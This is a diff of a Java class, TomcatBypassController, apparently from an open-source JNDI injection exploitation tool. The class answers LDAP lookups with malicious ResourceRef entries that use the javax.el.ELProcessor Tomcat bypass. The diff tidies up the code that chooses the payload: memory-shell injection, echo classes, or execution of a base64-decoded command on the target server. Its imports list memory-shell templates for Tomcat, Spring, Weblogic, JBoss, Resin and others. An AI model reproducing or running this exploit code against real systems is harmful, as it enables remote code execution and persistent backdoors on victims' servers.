@@ -4,64 +4,30 @@ import com.qi4l.jndi.enumtypes.GadgetType;
 import com.qi4l.jndi.exceptions.IncorrectParamsException;
 import com.qi4l.jndi.exceptions.UnSupportedGadgetTypeException;
 import com.qi4l.jndi.exceptions.UnSupportedPayloadTypeException;
+import com.qi4l.jndi.gadgets.Config.Config;
 import com.qi4l.jndi.gadgets.utils.Gadgets;
 import com.qi4l.jndi.gadgets.utils.InjShell;
-import com.qi4l.jndi.gadgets.utils.handle.ClassNameHandler;
-import com.qi4l.jndi.template.*;
-import com.qi4l.jndi.template.Agent.WinMenshell;
-import com.qi4l.jndi.template.memshell.BypassNginxCDN.cmsMSBYNC;
-import com.qi4l.jndi.template.memshell.BypassNginxCDN.proxyMSBYNC;
-import com.qi4l.jndi.template.memshell.Tomcat_Spring_Jetty.MsTSJproxy;
-import com.qi4l.jndi.template.memshell.Tomcat_Spring_Jetty.MsTSJser;
-import com.qi4l.jndi.template.memshell.Websphere.WSFMSFromThread;
-import com.qi4l.jndi.template.memshell.Websphere.WSWebsphereProxy;
-import com.qi4l.jndi.template.memshell.Websphere.websphereEcho;
-import com.qi4l.jndi.template.echo.*;
-import com.qi4l.jndi.template.memshell.jboss.JBFMSFromContextF;
-import com.qi4l.jndi.template.memshell.jboss.JBSMSFromContextS;
-import com.qi4l.jndi.template.echo.JbossEcho;
-import com.qi4l.jndi.template.memshell.jetty.JFMSFromJMXF;
-import com.qi4l.jndi.template.memshell.jetty.JSMSFromJMXS;
-import com.qi4l.jndi.template.echo.JettyEcho;
-import com.qi4l.jndi.template.memshell.resin.RFMSFromThreadF;
-import com.qi4l.jndi.template.memshell.resin.RSMSFromThreadS;
-import com.qi4l.jndi.template.echo.ResinEcho;
-import com.qi4l.jndi.template.memshell.resin.WsResin;
-import com.qi4l.jndi.template.memshell.spring.SpringControllerMS;
-import com.qi4l.jndi.template.memshell.spring.SpringInterceptorMS;
-import com.qi4l.jndi.gadgets.Config.Config;
 import com.qi4l.jndi.gadgets.utils.Util;
-import com.qi4l.jndi.template.echo.weblogicEcho;
-import com.qi4l.jndi.gadgets.utils.ClassNameUtils;
-import com.qi4l.jndi.template.memshell.struts2.Struts2ActionMS;
-import com.qi4l.jndi.template.memshell.tomcat.*;
-import com.qi4l.jndi.template.memshell.weblogic.WsWeblogic;
+import com.qi4l.jndi.gadgets.utils.handle.ClassNameHandler;
 import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
 import com.unboundid.ldap.sdk.Entry;
 import com.unboundid.ldap.sdk.LDAPResult;
 import com.unboundid.ldap.sdk.ResultCode;
-import javassist.ClassClassPath;
-import javassist.ClassPool;
-import javassist.CtClass;
 import org.apache.commons.cli.CommandLine;
-import org.apache.commons.codec.binary.Base64;
 import org.apache.naming.ResourceRef;
 
 import javax.naming.StringRefAddr;
-
 import java.io.IOException;
-import java.lang.reflect.Field;
 
 import static org.fusesource.jansi.Ansi.ansi;
 
 
 @LdapMapping(uri = {"/tomcatbypass"})
 public class TomcatBypassController implements LdapController {
+    public static CommandLine cmdLine;
     private String     payloadType;
     private String[]   params;
     private GadgetType gadgetType;
-
-    public static CommandLine cmdLine;
 
     /**
      * 发送LDAP ResourceRef结果和重定向URL
@@ -73,7 +39,7 @@ public class TomcatBypassController implements LdapController {
     @Override
     public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
         try {
-            System.out.println(ansi().render("@|green [+]|@ Sending LDAP ResourceRef result for|@" + base + "  @|green with javax.el.ELProcessor payload|@"));
+            System.out.println(ansi().render("@|green [+] Sending LDAP ResourceRef result for|@" + base + "  @|green with javax.el.ELProcessor payload|@"));
             System.out.println("-------------------------------------- JNDI Local  Refenrence Links --------------------------------------");
             Entry e = new Entry(base);
             e.addAttribute("javaClassName", "java.lang.String");
@@ -82,20 +48,20 @@ public class TomcatBypassController implements LdapController {
             TomcatBypassHelper helper = new TomcatBypassHelper();
             String             code   = null;
 
-            if (payloadType.indexOf("E-") != -1) {
-                String ClassName1 = payloadType.substring(payloadType.indexOf('-') + 1);
-                final Class EchoClass = Class.forName(ClassNameHandler.searchClassByName(ClassName1));
+            if (payloadType.contains("E-")) {
+                String      ClassName1 = payloadType.substring(payloadType.indexOf('-') + 1);
+                final Class EchoClass  = Class.forName(ClassNameHandler.searchClassByName(ClassName1));
                 code = InjShell.injectClass(EchoClass);
             }
 
-            if (payloadType.indexOf("M-") != -1) {
+            if (payloadType.contains("M-")) {
                 String ClassName1 = payloadType.substring(payloadType.indexOf('-') + 1);
                 InjShell.init(params);
                 Class<?> classQ = Gadgets.createClassT(ClassName1);
                 code = InjShell.injectClass(classQ);
             }
 
-            if (payloadType == "command"){
+            if (payloadType.contains("command")) {
                 code = helper.getExecCode(params[0]);
             }
 
@@ -134,7 +100,7 @@ public class TomcatBypassController implements LdapController {
 
             try {
                 payloadType = base.substring(fistIndex + 1, secondIndex);
-                System.out.println(ansi().render("@|green [+]@ PaylaodType : |" + payloadType));
+                System.out.println(ansi().render("@|green [+] PaylaodType : |@" + payloadType));
             } catch (IllegalArgumentException e) {
                 throw new UnSupportedPayloadTypeException("UnSupportedPayloadType : " + base.substring(fistIndex + 1, secondIndex));
             }
@@ -156,7 +122,7 @@ public class TomcatBypassController implements LdapController {
 
             if (gadgetType == GadgetType.shell) {
                 String   cmd1         = Util.getCmdFromBase(base);
-                byte[]   decodedBytes = java.util.Base64.getDecoder().decode(cmd1);
+                byte[]   decodedBytes = Util.base64Decode(cmd1);
                 String   cmd          = new String(decodedBytes);
                 String[] cmdArray     = cmd.split(" ");
                 System.out.println(ansi().render("@|green [+] Command : |@" + cmd));
